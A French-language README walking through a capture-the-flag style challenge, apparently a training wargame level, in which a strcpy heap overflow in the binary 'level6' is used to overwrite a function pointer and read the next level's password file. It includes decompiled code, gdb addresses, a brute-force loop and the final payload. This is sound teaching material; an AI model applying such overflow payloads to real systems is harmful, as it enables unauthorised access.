### README - Exploitation du programme `level6`

## Introduction

Nous avons un exécutable `level6` avec les options suivantes :

```bash
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level6/level6
```

### Code source décompilé

Voici le code source décompilé du programme `level6` :

```c
int n() {
  return system("/bin/cat /home/user/level7/.pass");
}

int m() {
  return puts("Nope");
}

int __cdecl main(int argc, const char **argv, const char **envp) {
  int (**v4)(void); // [esp+18h] [ebp-8h]
  char *v5; // [esp+1Ch] [ebp-4h]

  v5 = (char *)malloc(0x40u);
  v4 = (int (**)(void))malloc(4u);
  *v4 = m;
  strcpy(v5, argv[1]);
  return (*v4)();
}
```

### Analyse de la vulnérabilité

#### Fonction `strcpy`

La fonction `strcpy` copie une chaîne de caractères d'une source vers une destination sans vérifier la taille de la destination. Si la source est plus grande que la destination, cela provoque un débordement de tampon, écrasant la mémoire adjacente. Cela peut être exploité pour rediriger le flux d'exécution du programme.

#### Fonctionnement du code

1. **Allocation mémoire** :
   - `v5` reçoit 64 octets avec `malloc(0x40u)`.
   - `v4` reçoit 4 octets avec `malloc(4u)` et est initialisé pour pointer vers la fonction `m`.

2. **Copie de la chaîne utilisateur** :
   - `strcpy(v5, argv[1])` copie l'argument de la ligne de commande dans `v5`.
   - Si l'argument est suffisamment long, il peut écraser la mémoire adjacente, y compris `v4`.

3. **Appel de la fonction pointée par `v4`** :
   - `return (*v4)();` appelle la fonction pointée par `v4`. Initialement, c'est `m`, mais si nous écrasons `v4`, nous pouvons rediriger l'exécution vers `n`.

### Exploitation de la vulnérabilité

Pour exploiter cette vulnérabilité, nous devons écraser le pointeur de fonction `v4` avec l'adresse de la fonction `n`. 

### Adresse de la fonction `n`

Avec `gdb`, nous trouvons l'adresse de la fonction `n` :

```gdb
(gdb) info functions
0x08048454  n
0x08048468  m
0x0804847c  main
```

L'adresse de la fonction `n` est `0x08048454`.

### Détermination de l'index correct

Pour trouver l'index où l'écrasement se produit, nous avons utilisé une boucle pour tester différents nombres d'occurrences de l'adresse de la fonction `n` :

```bash
for i in {0..100}; do echo "Testing with $i occurrences"; ./level6 $(python -c "print '\x54\x84\x04\x08'*$i"); done
```

### Analyse des résultats

En analysant la sortie, nous avons déterminé que l'écrasement se produit après 19 occurrences de l'adresse.

### Payload final

```bash
./level6 $(python -c "print '\x54\x84\x04\x08'*19")
```

### Explication détaillée

1. **Adresse de `n` en little-endian** : `\x54\x84\x04\x08`
2. **19 occurrences** : Suffisamment de répétitions pour écraser `v4` avec l'adresse de `n`.

### Exemple complet

Voici un résumé des commandes pour trouver l'index et exploiter la vulnérabilité :

1. **Trouver l'index correct** :

```bash
for i in {0..100}; do echo "Testing with $i occurrences"; ./level6 $(python -c "print '\x54\x84\x04\x08'*$i"); done
```

2. **Exploiter la vulnérabilité** :

```bash
./level6 $(python -c "print '\x54\x84\x04\x08'*19")
```

### Conclusion

En utilisant cette méthode, nous exploitons la vulnérabilité de débordement de tampon causée par `strcpy` pour écraser le pointeur de fonction `v4` avec l'adresse de la fonction `n`. Cela redirige l'exécution vers `n`, qui exécute la commande `system("/bin/cat /home/user/level7/.pass")`, nous permettant ainsi de lire le mot de passe pour le niveau suivant.